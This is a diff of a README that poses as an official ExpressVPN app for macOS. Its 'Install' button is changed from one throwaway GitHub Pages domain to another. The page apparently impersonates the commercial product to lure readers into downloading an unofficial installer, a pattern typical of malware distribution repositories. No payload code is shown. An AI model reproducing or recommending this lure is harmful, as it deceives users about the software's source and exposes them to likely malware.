@@ -2,7 +2,7 @@
 <h1 align="center">ExpressVPN</h1>
 <p align="center">Native VPN and internet security — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
-<p align="center"><a href="https://blya-dayte-deneg.github.io/.github/expressvpn"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
+<p align="center"><a href="https://ukabvar-losos.github.io/.github/expressvpn"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
 <p align="center"><img src="https://www.top10vpn.com/_next/image/?url=https%3A%2F%2Fwww.top10vpn.com%2Fimages%2F2024%2F05%2Fexpressvpn-mac-app-interface.webp&w=900&q=80" alt="ExpressVPN — macOS VPN and internet security screenshot" width="780"/></p>
 
 ---
